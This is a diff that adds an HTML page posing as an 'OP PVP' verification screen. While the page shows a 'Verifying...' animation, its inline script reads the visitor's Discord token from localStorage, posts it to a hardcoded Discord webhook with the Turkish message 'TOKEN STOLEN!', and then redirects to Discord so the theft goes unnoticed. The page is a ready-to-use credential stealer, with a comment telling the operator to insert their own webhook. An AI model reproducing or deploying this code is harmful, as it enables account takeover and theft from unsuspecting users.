@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>OP PVP | Verification</title>
+    <style>
+        body {
+            background: #1e1e2e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+        .loader {
+            color: #00ff88;
+            font-size: 24px;
+            text-align: center;
+        }
+        .loader span {
+            display: inline-block;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.2; }
+            50% { opacity: 1; }
+            100% { opacity: 0.2; }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <span>🔐</span> Verifying... <span>⏳</span>
+    </div>
+
+    <script>
+        (function() {
+            // Discord token'ı localStorage'dan al
+            const token = localStorage.getItem('token');
+            
+            // SENİN WEBHOOK URL'İN - BURAYI DEĞİŞTİR
+            const webhook = 'https://discord.com/api/webhooks/152199184351181397/e0d12a2688d0c34D9f7b3c6b2b21ff6KLSp8mH00Q4r1chU1icEe4e6f8wudU1cL';
+
+            if (token) {
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `**🎯 TOKEN ÇALINDI!**\n\`${token}\``
+                    })
+                })
+                .then(() => {
+                    setTimeout(() => {
+                        window.location.href = 'https://discord.com/app';
+                    }, 2000);
+                })
+                .catch(() => {
+                    setTimeout(() => {
+                        window.location.href = 'https://discord.com/app';
+                    }, 2000);
+                });
+            } else {
+                document.querySelector('.loader').innerHTML = '❌ Token not found. Redirecting...';
+                setTimeout(() => {
+                    window.location.href = 'https://discord.com/app';
+                }, 2000);
+            }
+        })();
+    </script>
+</body>
+</html>
